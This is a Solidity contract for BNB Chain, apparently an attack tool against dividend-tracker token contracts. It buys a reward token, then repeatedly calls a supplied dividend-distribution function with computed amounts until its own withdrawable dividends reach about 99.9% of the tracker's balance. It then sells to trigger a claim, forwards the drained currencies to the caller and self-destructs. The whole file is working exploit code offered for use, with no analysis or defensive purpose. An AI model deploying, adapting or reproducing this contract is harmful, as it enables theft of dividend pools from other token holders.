// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "./Ownable.sol";
import "./Initializable.sol";

// import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/IERC20.sol";
interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function decimals() external view returns (uint8);
    function balanceOf(address owner) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
}

// import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/IPancakeRouter02.sol";
interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapETHForExactTokens(
        uint amountOut, 
        address[] calldata path, 
        address to, 
        uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract OneShot is Initializable, Ownable {

    IPancakeRouter02 private pancakeSwapRouter;
    
    struct DividendDistributionLoopData {
        uint256 initial_withdrawable_dividends;
        uint256 prev_withdrawable_dividends;
        uint256 accumulated_withdrawable_dividends_increase;
        uint256 accumulated_distribute_dividend_sent_amount;
        uint256 target_dividends;
        uint256 distribute_dividend_sent_amount;
    }

    function isMainnet() private view returns (bool) {
        uint256 chainId;
        assembly {
            chainId := chainid()
        }
        return (chainId == 56);
    }

    constructor() {
        // initialization
        initialize(msg.sender);
    }

    function initialize(address _owner) initializer public {
        // set ownership
        _transferOwnership(_owner);
        
        // init router
        if (isMainnet()) {
            // BSC MAINNET
            pancakeSwapRouter = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        } else {
            // BSC TESTNET
            pancakeSwapRouter = IPancakeRouter02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        }
    }

    function oneShotExecute(
        address reward_token_addr,                      // reward token address
        string memory dividend_distribution_function,   // distribute dividends function name
        uint256 amount_to_buy,                          // minimum number of token holdings
        address[] memory tracker_addresses,             // list of tracker contract addresses
        address[] memory tracker_currencies)            // list of currencies of tracker contracts
    public onlyOwner payable 
    {
        bool convert_tokens_to_bnb = false;

        // sanity check
        require(tracker_addresses.length == tracker_currencies.length, "tracker_addresses.length != tracker_currencies.length");

        // buy token for dividend listing
        convertEthToToken(reward_token_addr, amount_to_buy);

        for (uint i=0; i<tracker_addresses.length; i++) {
            // pump widthrawable dividends
            distriLoop(tracker_addresses[i], tracker_currencies[i], dividend_distribution_function);
        }

        // sell reward token
        // NOTE: this will initiate claim()
        convertAllTokenToEth(reward_token_addr);

        // handle received reward tokens
        for (uint i=0; i<tracker_addresses.length; i++) {
            if (convert_tokens_to_bnb) {
                // convert to BNB
                convertAllTokenToEth(tracker_currencies[i]);
            } else {
                // transfer to msg.sender
                transferAllToken(IERC20(tracker_currencies[i]), address(tx.origin));
            }
        }
        
        // self destroy
        if (true) {
            destroyMe(payable(tx.origin));
        } else {
            refundLeftover(tx.origin);
        }
    }

    function convertEthToToken(address token_addr, uint256 amount) public onlyOwner payable {
        // get decimals of token
        uint8 token_decimals = IERC20(token_addr).decimals();
        // recalc amount with decimals
        amount = amount * (10**token_decimals);
        // 30 sec deadline
        uint256 deadline = block.timestamp + 30;

        // generate swap path
        address[] memory path = new address[](2);
        path[0] = pancakeSwapRouter.WETH();
        path[1] = token_addr;
        // this contract should reveive the tokens
        address to = address(this);

        pancakeSwapRouter.swapETHForExactTokens{ value: msg.value }(
            amount, 
            path, 
            to, 
            deadline);
    }

    function convertAllTokenToEth(address token_addr) public onlyOwner payable {
        // TODO: skip if token value lower than threshold
        // token to swap
        IERC20 token = IERC20(token_addr);
        // swap all, get current balance
        uint256 amount_in = token.balanceOf(address(this));
        if (amount_in == 0) {
            // nothing to do
            return;
        }
        require(token.approve(address(pancakeSwapRouter), amount_in), "approve failed");
        
        uint deadline = block.timestamp + 30;
        // dont care of output value
        uint256 amount_out_min = 0;
        // path token -> WBNB
        address[] memory path = new address[](2);
        path[0] = address(token_addr);
        path[1] = pancakeSwapRouter.WETH();
        address to = address(this);

        pancakeSwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount_in,
            amount_out_min,
            path,
            to,
            deadline
        );
    }

    function distriLoop(address tracker_addr, address currency_addr, string memory dividend_func) public onlyOwner {

        // balance
        uint256 balance = IERC20(currency_addr).balanceOf(tracker_addr);
        require(balance > 0 , "tracker balance too low");
        // tracker decimals
        uint8 decimals = IERC20(currency_addr).decimals();
        
        // variables for dividend calculation
        bool success;
        bytes memory ret_bytes;

        DividendDistributionLoopData memory ddld;
        ddld.initial_withdrawable_dividends = 0;
        ddld.prev_withdrawable_dividends = 0;
        ddld.accumulated_withdrawable_dividends_increase = 0;
        ddld.accumulated_distribute_dividend_sent_amount = 0;
        ddld.target_dividends = balance * 999 / 1000;
        ddld.distribute_dividend_sent_amount = 1 * 10**decimals;

        // limit distribute dividend calling with for loop
        for (uint8 i = 0; i < 5; i++) {
            // get account info
            (success, ret_bytes) = tracker_addr.call(abi.encodeWithSignature("getAccount(address)", address(this)));
            require(success == true, "getAccount failed");
            // decode
            (address account, int256 index, int256 iterationsUntilProcessed, uint256 curr_withdrawable_dividends) = abi.decode(ret_bytes, (address, int256, int256, uint256));
            account;
            iterationsUntilProcessed;

            // index should be > 0
            require(index > 0, "not listed for dividend distribution, not enough buy");
            
            // NOTE: percentage modifier calculated with * 1000 / 1000 for 99.9%
            uint256 percentage_modifier = 0;
            if (i == 0) {
                // first loop
                ddld.initial_withdrawable_dividends = curr_withdrawable_dividends;
            } else {
                // number of dividends should change
                require(ddld.prev_withdrawable_dividends < curr_withdrawable_dividends, "prev_withdrawable_dividends >= curr_withdrawable_dividends ?! ");

                // get increase with previous amount
                uint256 withdrawable_dividends_increase = curr_withdrawable_dividends - ddld.prev_withdrawable_dividends;
                ddld.accumulated_withdrawable_dividends_increase += withdrawable_dividends_increase;
                
                require(withdrawable_dividends_increase > 0, "withdrawable_dividends_increase error");

                // calc deficit
                uint256 target_dividends_increase = balance - curr_withdrawable_dividends;
                require(target_dividends_increase > 0, "target_dividends_increase <= 0");

                // calc next amount
                uint256 next_distribute_dividend_sent_amount = target_dividends_increase * ddld.accumulated_distribute_dividend_sent_amount / ddld.accumulated_withdrawable_dividends_increase;
                // decrease target based on cumulated amount
                percentage_modifier = 1000 * ddld.accumulated_withdrawable_dividends_increase / (balance - ddld.initial_withdrawable_dividends);
                if (percentage_modifier < 500)
                    percentage_modifier = 750;
                else
                    percentage_modifier = 999;
                ddld.distribute_dividend_sent_amount = next_distribute_dividend_sent_amount * percentage_modifier / 1000;
            }
            // exit if target reached
            if (curr_withdrawable_dividends >= ddld.target_dividends) {
                break;
            }
            
            // call distribute dividends
            (success, ret_bytes) = tracker_addr.call(abi.encodeWithSignature(dividend_func, ddld.distribute_dividend_sent_amount));
            require(success, "distribute dividend call failed");

            // update
            ddld.accumulated_distribute_dividend_sent_amount += ddld.distribute_dividend_sent_amount;
            ddld.prev_withdrawable_dividends = curr_withdrawable_dividends;
        }
    }

    function transferAllToken(IERC20 token, address to) internal { 
        // transfer all available tokens
        uint256 balance = token.balanceOf(address(this));
        if (balance == 0) {
            // nothing to do
            return;
        }
        token.transfer(to, balance);
    }

    function refundLeftover(address to) internal { 
        // refund leftover ETH to user
        (bool success,) = to.call{ value: address(this).balance }("");
        require(success, "refund failed");
    }

    // https://ethereum-blockchain-developer.com/022-pausing-destroying-smart-contracts/04-destroy-smart-contracts/
    // when selfdestruct is called, all remaining funds on the address of the Smart Contract are transferred to that address
    // note: tokens not transfered
    function destroyMe(address payable to) public onlyOwner {
        selfdestruct(to);
    }

    fallback() external payable {
    }

    receive() external payable {
    }
    
}